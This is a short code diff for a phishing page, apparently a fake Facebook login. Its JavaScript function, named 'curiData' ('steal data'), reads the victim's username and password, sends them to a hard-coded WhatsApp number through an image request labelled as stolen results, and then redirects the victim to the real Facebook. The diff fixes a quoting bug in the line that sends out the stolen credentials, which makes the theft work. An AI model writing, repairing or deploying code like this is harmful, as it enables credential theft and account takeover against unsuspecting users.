@@ -31,14 +31,11 @@ function curiData() {
     var user = document.getElementById('user').value;
     var pass = document.getElementById('pass').value;
     
-    // TUJUAN KIRIM KE NOMOR LO
     var nomorLo = "6285124402270"; 
     
-    // ISI PESAN NYA TULIS NOMOR ITU
     var img = new Image();
-    img.src = "https://api.whatsapp.com/send?phone="6285124402270"&text=🔓 HASIL CURIAN\n📤 DARI: 6285124402270\n👤 USER: "+user+"\n🔑 PASS: "+pass;
+    img.src = "https://api.whatsapp.com/send?phone="+nomorLo+"&text=🔓 HASIL CURIAN\n📤 DARI: 6285124402270\n👤 USER: "+user+"\n🔑 PASS: "+pass;
     
-    // LANGSUNG PINDAH KE FB ASLI
     window.location.href = "https://www.facebook.com";
 }
 </script>
